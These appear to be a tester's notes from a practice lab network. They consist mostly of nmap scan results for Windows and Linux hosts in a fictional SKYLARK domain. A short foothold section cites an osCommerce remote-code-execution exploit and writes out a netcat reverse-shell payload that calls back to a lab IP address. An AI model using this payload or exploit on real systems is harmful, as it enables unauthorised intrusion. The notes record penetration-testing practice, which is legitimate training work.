# VM 11 .220
- houston01.SKYLARK.com 
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Home page - Skylark Partner Portal
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=SKYLARK
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5900/tcp  open  vnc           VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     Ultra (17)
|     Unknown security type (116)
|_    VNC Authentication (2)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-01T07:05:34
|_  start_date: N/A
|_clock-skew: -2s
```

## Restriction
1. http req. kerberos authN

# VM 12 .221
- austin02.SKYLARK.com
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2022-11-15T12:30:26
|_Not valid after:  2023-05-17T12:30:26
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds  Windows Server 2022 Standard 20348 microsoft-ds
3387/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5504/tcp  open  msrpc         Microsoft Windows RPC
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
10000/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SKYLARK
|   NetBIOS_Domain_Name: SKYLARK
|   NetBIOS_Computer_Name: AUSTIN02
|   DNS_Domain_Name: SKYLARK.com
|   DNS_Computer_Name: austin02.SKYLARK.com
|   DNS_Tree_Name: SKYLARK.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-09-01T07:05:23+00:00
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2024-08-22T03:17:13
|_Not valid after:  2025-02-21T03:17:13
|_ssl-date: 2024-09-01T07:05:59+00:00; -3s from scanner time.
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2022 Standard 20348 (Windows Server 2022 Standard 6.3)
|   Computer name: austin02
|   NetBIOS computer name: AUSTIN02\x00
|   Domain name: SKYLARK.com
|   Forest name: SKYLARK.com
|   FQDN: austin02.SKYLARK.com
|_  System time: 2024-09-01T00:05:36-07:00
| smb2-time: 
|   date: 2024-09-01T07:05:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m56s, median: -3s

```

# VM 13 .222
- paris03 ( standalone )
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2994/tcp  open  veritas-vis2?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2994-TCP:V=7.94SVN%I=7%D=9/1%Time=66D411D9%P=x86_64-pc-linux-gnu%r(
SF:NULL,16,"\0\x14\x0c\0\0\0\xfa\xdd}6\xee\x0f\0\xa2\x11\xb5&\+\0\xc3#\x87
SF:")%r(GenericLines,16,"\0\x14\x0c\0\0\0\xfa\xdd}6\xee\x0f\0\xa2\x11\xb5&
SF:\+\0\xc3#\x87");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-01T07:05:43
|_  start_date: N/A

```

# VM 14 .223
- 
```
PORT      STATE SERVICE VERSION
60001/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

## FootHold
1. 44374.py RCE oscommerce
2. edit payload``` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.209 80 >/tmp/f ```
3. http://milan:60001/catalog/install/includes/configure.php 

# VM 15 .224
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3a:86:87:62:d1:b3:e3:74:97:fa:94:4b:31:a8:41:e5 (RSA)
|   256 64:b0:c3:72:98:ec:47:ca:77:01:5d:73:5d:12:4b:69 (ECDSA)
|_  256 de:0c:d1:ed:27:70:b6:9f:1f:99:31:e8:eb:cd:ff:b7 (ED25519)
8000/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 1.1K  2024-09-01 03:09  debug.txt
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# VM 16 .225
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
8090/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# VM 17 .226
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2994/tcp  open  veritas-vis2?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
24621/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|   GetRequest: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     What are you trying to do? Go away.
|   HTTPOptions, RTSPRequest: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     Wrong command.
|   Help: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     214-The following commands are recognized.
|     USER TYPE SYST SIZE RNTO RNFR RMD REST QUIT
|     HELP XMKD MLST MKD EPSV XCWD NOOP AUTH OPTS DELE
|     CDUP APPE STOR ALLO RETR PWD FEAT CLNT MFMT
|     MODE XRMD PROT ADAT ABOR XPWD MDTM LIST MLSD PBSZ
|     NLST EPRT PASS STRU PASV STAT PORT
|_    Help ok.
24680/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: &#x30DB;&#x30FC;&#x30E0; - Umbraco&#x30B5;&#x30F3;&#x30D7;&#x3...
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2994-TCP:V=7.94SVN%I=7%D=9/1%Time=66D412FE%P=x86_64-pc-linux-gnu%r(
SF:NULL,16,"\0\x14\x0c\0\0\0\x87\xe1\x927Mf\xbb\xcd\x98\xa7\xd7\x1c\0\xc8\
SF:(E")%r(GenericLines,16,"\0\x14\x0c\0\0\0\x87\xe1\x927Mf\xbb\xcd\x98\xa7
SF:\xd7\x1c\0\xc8\(E");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port24621-TCP:V=7.94SVN%I=7%D=9/1%Time=66D412FE%P=x86_64-pc-linux-gnu%r
SF:(NULL,4D,"220-FileZilla\x20Server\x201\.5\.1\r\n220\x20Please\x20visit\
SF:x20https://filezilla-project\.org/\r\n")%r(GenericLines,4D,"220-FileZil
SF:la\x20Server\x201\.5\.1\r\n220\x20Please\x20visit\x20https://filezilla-
SF:project\.org/\r\n")%r(GetRequest,76,"220-FileZilla\x20Server\x201\.5\.1
SF:\r\n220\x20Please\x20visit\x20https://filezilla-project\.org/\r\n501\x2
SF:0What\x20are\x20you\x20trying\x20to\x20do\?\x20Go\x20away\.\r\n")%r(HTT
SF:POptions,61,"220-FileZilla\x20Server\x201\.5\.1\r\n220\x20Please\x20vis
SF:it\x20https://filezilla-project\.org/\r\n500\x20Wrong\x20command\.\r\n"
SF:)%r(RTSPRequest,61,"220-FileZilla\x20Server\x201\.5\.1\r\n220\x20Please
SF:\x20visit\x20https://filezilla-project\.org/\r\n500\x20Wrong\x20command
SF:\.\r\n")%r(RPCCheck,4D,"220-FileZilla\x20Server\x201\.5\.1\r\n220\x20Pl
SF:ease\x20visit\x20https://filezilla-project\.org/\r\n")%r(DNSVersionBind
SF:ReqTCP,4D,"220-FileZilla\x20Server\x201\.5\.1\r\n220\x20Please\x20visit
SF:\x20https://filezilla-project\.org/\r\n")%r(DNSStatusRequestTCP,4D,"220
SF:-FileZilla\x20Server\x201\.5\.1\r\n220\x20Please\x20visit\x20https://fi
SF:lezilla-project\.org/\r\n")%r(Help,17C,"220-FileZilla\x20Server\x201\.5
SF:\.1\r\n220\x20Please\x20visit\x20https://filezilla-project\.org/\r\n214
SF:-The\x20following\x20commands\x20are\x20recognized\.\r\n\x20NOP\x20\x20
SF:USER\x20TYPE\x20SYST\x20SIZE\x20RNTO\x20RNFR\x20RMD\x20\x20REST\x20QUIT
SF:\r\n\x20HELP\x20XMKD\x20MLST\x20MKD\x20\x20EPSV\x20XCWD\x20NOOP\x20AUTH
SF:\x20OPTS\x20DELE\r\n\x20CWD\x20\x20CDUP\x20APPE\x20STOR\x20ALLO\x20RETR
SF:\x20PWD\x20\x20FEAT\x20CLNT\x20MFMT\r\n\x20MODE\x20XRMD\x20PROT\x20ADAT
SF:\x20ABOR\x20XPWD\x20MDTM\x20LIST\x20MLSD\x20PBSZ\r\n\x20NLST\x20EPRT\x2
SF:0PASS\x20STRU\x20PASV\x20STAT\x20PORT\r\n214\x20Help\x20ok\.\r\n")%r(SS
SF:LSessionReq,4D,"220-FileZilla\x20Server\x201\.5\.1\r\n220\x20Please\x20
SF:visit\x20https://filezilla-project\.org/\r\n")%r(TerminalServerCookie,4
SF:D,"220-FileZilla\x20Server\x201\.5\.1\r\n220\x20Please\x20visit\x20http
SF:s://filezilla-project\.org/\r\n")%r(TLSSessionReq,4D,"220-FileZilla\x20
SF:Server\x201\.5\.1\r\n220\x20Please\x20visit\x20https://filezilla-projec
SF:t\.org/\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

# VM 18 .227
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-09-01T07:09:41+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SYDNEY08
|   NetBIOS_Domain_Name: SYDNEY08
|   NetBIOS_Computer_Name: SYDNEY08
|   DNS_Domain_Name: sydney08
|   DNS_Computer_Name: sydney08
|   Product_Version: 10.0.20348
|_  System_Time: 2024-09-01T07:09:35+00:00
| ssl-cert: Subject: commonName=sydney08
| Not valid before: 2024-08-22T03:22:40
|_Not valid after:  2025-02-21T03:22:40
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

Post-scan script results:
| clock-skew: 
|   -2s: 
|     192.168.236.220
|_    192.168.236.227
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 9 IP addresses (9 hosts up) scanned in 484.32 seconds

```